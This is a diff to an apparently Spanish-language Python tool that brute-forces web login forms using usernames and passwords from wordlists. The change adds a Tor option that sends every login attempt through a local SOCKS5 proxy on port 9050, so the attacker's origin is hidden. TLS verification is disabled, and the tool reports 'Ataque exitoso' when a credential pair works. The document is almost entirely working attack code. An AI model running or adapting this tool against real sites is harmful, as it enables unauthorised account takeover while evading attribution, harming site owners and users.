@@ -7,15 +7,23 @@ from lxml.html import fromstring
 import os.path
 from termcolor import colored
 import re
+import socket
+import socks
 
-def check(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxport,proxip):
+def check(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxport,proxip,tor):
 	b = ['','1','12']
 	a = []
 	print colored("\nBeginning BruteForce", 'yellow')
 	
 	requests.packages.urllib3.disable_warnings()
 	if len(proxip) == 0:
-		req = requests.get(url,verify=False)
+		if tor == True:
+			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5,'127.0.0.1',9050)
+			socket.socket = socks.socksocket
+			proxies = {'http' : 'socks5://127.0.0.1:9050', 'https' : 'socks5://127.0.0.1:9050',}
+			req = requests.get(url,proxies = {'http': 'socks5://127.0.0.1:9050'},verify=False)
+		else:
+			req = requests.get(url,verify=False)
 	else:
 		proxy = proxip  + ':' + proxport
 		proxies = {'http' : proxy, 'https' : proxy,}
@@ -53,7 +61,13 @@ def check(url, userField, passField, user, pwd, userFile, pwdFile, message,verbo
 		headers = {'user-agent': agent}
 		cookies = {'': cookie} 
 		if len(proxip) == 0:
-			r = requests.post(url, payload,cookies = cookies, headers = headers, verify=False)
+			if tor == True:
+				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5,'127.0.0.1',9050)
+				socket.socket = socks.socksocket
+				proxies = {'http' : 'socks5://127.0.0.1:9050', 'https' : 'socks5://127.0.0.1:9050',}
+				r = requests.post(url,payload,cookies = cookies, headers = headers,proxies = {'http': 'socks5://127.0.0.1:9050'},verify=False)
+			else:
+				r = requests.post(url, payload,cookies = cookies, headers = headers, verify=False)
 		else:
 			proxy = proxip  + ':' + proxport
 			proxies = {'http' : proxy, 'https' : proxy,}
@@ -61,15 +75,15 @@ def check(url, userField, passField, user, pwd, userFile, pwdFile, message,verbo
 		a.append(len(r.content))
 	
 	if len(userFile) == 0 and len(pwdFile) == 0 and len(user) > 0 and len(pwd) > 0 :
-		single(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxport,proxip,a)
+		single(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxport,proxip,a,tor)
 	elif len(user) == 0 and len(pwd) == 0 and len(userFile) > 0 and len(pwdFile) > 0:
-		doubleFile(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxport,proxip,a)
+		doubleFile(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxport,proxip,a,tor)
 	elif len(user) == 0 and len(pwdFile) == 0 and len(pwd) > 0 and len(userFile) > 0:
-		usersFile(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxport,proxip,a)
+		usersFile(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxport,proxip,a,tor)
 	elif len(pwd) == 0 and len(userFile) == 0 and len(user) > 0 and len(pwdFile) > 0:
-		passFile(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxport,proxip,a)
+		passFile(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxport,proxip,a,tor)
 		
-def single(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxip,proxport,list):
+def single(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxip,proxport,list,tor):
 	
 	mbefore = message
 	requests.packages.urllib3.disable_warnings()		
@@ -79,7 +93,13 @@ def single(url, userField, passField, user, pwd, userFile, pwdFile, message,verb
 	headers = {'user-agent': agent}
 	cookies = {'': cookie} 
 	if len(proxip) == 0:
-		r = requests.post(url, payload,cookies = cookies, headers = headers, verify=False)
+		if tor == True:
+			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5,'127.0.0.1',9050)
+			socket.socket = socks.socksocket
+			proxies = {'http' : 'socks5://127.0.0.1:9050', 'https' : 'socks5://127.0.0.1:9050',}
+			r = requests.post(url,payload,cookies = cookies, headers = headers,proxies = {'http': 'socks5://127.0.0.1:9050'},verify=False)
+		else:
+			r = requests.post(url, payload,cookies = cookies, headers = headers, verify=False)
 	else:
 		proxy = proxip  + ':' + proxport
 		proxies = {'http' : proxy, 'https' : proxy,}
@@ -133,7 +153,7 @@ def single(url, userField, passField, user, pwd, userFile, pwdFile, message,verb
 				print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(user,'blue') + ' Password: ' + colored(pwd,'blue')	
 		
 		
-def usersFile(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxip,proxport,list):
+def usersFile(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxip,proxport,list,tor):
 	
 	users = []
 	requests.packages.urllib3.disable_warnings()		
@@ -153,7 +173,13 @@ def usersFile(url, userField, passField, user, pwd, userFile, pwdFile, message,v
 			headers = {'user-agent': agent}
 			cookies = {'': cookie} 
 			if len(proxip) == 0:
-				r = requests.post(url,data = payload, cookies = cookies, headers = headers, verify=False)
+				if tor == True:
+					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5,'127.0.0.1',9050)
+					socket.socket = socks.socksocket
+					proxies = {'http' : 'socks5://127.0.0.1:9050', 'https' : 'socks5://127.0.0.1:9050',}
+					r = requests.post(url,data=payload,cookies = cookies, headers = headers,proxies = {'http': 'socks5://127.0.0.1:9050'},verify=False)
+				else:
+					r = requests.post(url,data = payload, cookies = cookies, headers = headers, verify=False)
 			else:
 				proxy = proxip  + ':' + proxport
 				proxies = {'http' : proxy, 'https' : proxy,}
@@ -208,7 +234,7 @@ def usersFile(url, userField, passField, user, pwd, userFile, pwdFile, message,v
 						print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue') + ' Password: ' + colored(pwd,'blue')
 	
 
-def passFile(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxport,proxip,list):
+def passFile(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxport,proxip,list,tor):
 	passwords = []
 	requests.packages.urllib3.disable_warnings()		
 		
@@ -227,7 +253,13 @@ def passFile(url, userField, passField, user, pwd, userFile, pwdFile, message,ve
 			headers = {'user-agent': agent}
 			cookies = {'': cookie} 
 			if len(proxip) == 0:
-				r = requests.post(url,data = payload, cookies = cookies, headers = headers, verify=False)
+				if tor == True:
+					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5,'127.0.0.1',9050)
+					socket.socket = socks.socksocket
+					proxies = {'http' : 'socks5://127.0.0.1:9050', 'https' : 'socks5://127.0.0.1:9050',}
+					r = requests.post(url,data = payload,cookies = cookies, headers = headers,proxies = {'http': 'socks5://127.0.0.1:9050'},verify=False)
+				else:
+					r = requests.post(url,data = payload, cookies = cookies, headers = headers, verify=False)
 			else:
 				proxy = proxip  + ':' + proxport
 				proxies = {'http' : proxy, 'https' : proxy,}
@@ -282,7 +314,7 @@ def passFile(url, userField, passField, user, pwd, userFile, pwdFile, message,ve
 						print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(user,'blue') + ' Password: ' + colored(passwords[i].rstrip('\n'),'blue')
 
 	
-def doubleFile(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxport,proxip,list):
+def doubleFile(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxport,proxip,list,tor):
 	
 	users = []
 	passwords = []
@@ -314,7 +346,13 @@ def doubleFile(url, userField, passField, user, pwd, userFile, pwdFile, message,
 				headers = {'user-agent': agent}
 				cookies = {'': cookie} 
 				if len(proxip) == 0:
-					r = requests.post(url,data = payload, cookies = cookies, headers = headers, verify=False)
+					if tor == True:
+						socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5,'127.0.0.1',9050)
+						socket.socket = socks.socksocket
+						proxies = {'http' : 'socks5://127.0.0.1:9050', 'https' : 'socks5://127.0.0.1:9050',}
+						r = requests.post(url,data = payload,cookies = cookies, headers = headers,proxies = {'http': 'socks5://127.0.0.1:9050'},verify=False)
+					else:
+						r = requests.post(url,data = payload, cookies = cookies, headers = headers, verify=False)
 				else:
 					proxy = proxip  + ':' + proxport
 					proxies = {'http' : proxy, 'https' : proxy,}
